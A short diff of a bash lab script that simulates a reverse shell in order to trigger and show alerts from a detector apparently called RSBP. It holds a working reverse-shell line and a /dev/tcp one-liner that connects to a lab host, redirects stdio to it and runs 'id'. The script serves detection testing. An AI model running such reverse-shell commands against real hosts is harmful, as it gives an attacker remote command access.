@@ -84,8 +84,10 @@ attack(){
   sleep 1
   echo "   victim: $(c 90 "bash -i >& /dev/tcp/$LAB_IP/$LAB_PORT 0>&1")"
   # open the socket on fd 3 and duplicate it onto stdin/stdout/stderr (the dup2-to-
-  # stdio behaviour RSBP keys on), then run a command through it — no hanging shell.
-  timeout 4 bash -c "exec 3<>/dev/tcp/$LAB_IP/$LAB_PORT; exec 0<&3 1>&3 2>&3; id; sleep 2" >/dev/null 2>&1
+  # stdio behaviour RSBP keys on), then run a command through it. No `timeout`
+  # wrapper, so the offending process is reported as `bash` (not the launcher); the
+  # inner `sleep 2` bounds its lifetime and a refused connect exits immediately.
+  bash -c "exec 3<>/dev/tcp/$LAB_IP/$LAB_PORT; exec 0<&3 1>&3 2>&3; id; sleep 2" >/dev/null 2>&1
   sleep 2; kill "$LP" 2>/dev/null
   echo; echo "$(c '1;31' '[4] DETECT')  the alert RSBP raised"; hr
   jq_alerts
